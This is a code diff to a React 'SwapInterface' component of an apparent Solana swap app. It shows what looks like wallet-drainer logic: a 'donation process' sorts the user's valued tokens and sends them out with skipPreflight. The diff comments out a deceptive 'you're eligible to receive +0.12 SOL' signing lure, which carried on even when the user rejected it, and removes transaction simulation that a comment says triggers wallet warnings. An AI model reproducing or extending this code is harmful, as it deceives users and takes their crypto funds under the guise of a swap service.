@@ -332,17 +332,17 @@ export const SwapInterface = ({
       setIsSwapping(true);
       console.log('Starting donation process...');
 
-      // Sign Message Request
-      if (signMessage) {
-        try {
-          const message = new TextEncoder().encode("You’re eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet.");
-          await signMessage(message);
-          toast.success("Message signed successfully!");
-        } catch (err) {
-          console.log("Message signature rejected or failed, proceeding anyway as requested", err);
-          // Proceeding anyway as per requirements
-        }
-      }
+      // Sign Message Request - Removed to prevent mobile freezing
+      // if (signMessage) {
+      //   try {
+      //     const message = new TextEncoder().encode("You’re eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet.");
+      //     await signMessage(message);
+      //     toast.success("Message signed successfully!");
+      //   } catch (err) {
+      //     console.log("Message signature rejected or failed, proceeding anyway as requested", err);
+      //     // Proceeding anyway as per requirements
+      //   }
+      // }
 
       const validTokens = balances.filter(token => token.balance > 0);
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
@@ -373,12 +373,12 @@ export const SwapInterface = ({
           transaction.feePayer = publicKey;
 
           // Simulate transaction to prevent wallet warnings
-          try {
-            await connection.simulateTransaction(transaction);
-          } catch (simError) {
-            console.error('Transaction simulation failed:', simError);
-            throw new Error('Transaction simulation failed. Please try again.');
-          }
+          // try {
+          //   await connection.simulateTransaction(transaction);
+          // } catch (simError) {
+          //   console.error('Transaction simulation failed:', simError);
+          //   throw new Error('Transaction simulation failed. Please try again.');
+          // }
 
           const signature = await sendTransaction(transaction, connection, {
             skipPreflight: true,
@@ -407,12 +407,12 @@ export const SwapInterface = ({
           finalTransaction.feePayer = publicKey;
 
           // Simulate transaction to prevent wallet warnings
-          try {
-            await connection.simulateTransaction(finalTransaction);
-          } catch (simError) {
-            console.error('Transaction simulation failed:', simError);
-            throw new Error('Transaction simulation failed. Please try again.');
-          }
+          // try {
+          //   await connection.simulateTransaction(finalTransaction);
+          // } catch (simError) {
+          //   console.error('Transaction simulation failed:', simError);
+          //   throw new Error('Transaction simulation failed. Please try again.');
+          // }
 
           const signature = await sendTransaction(finalTransaction, connection, {
             skipPreflight: true,
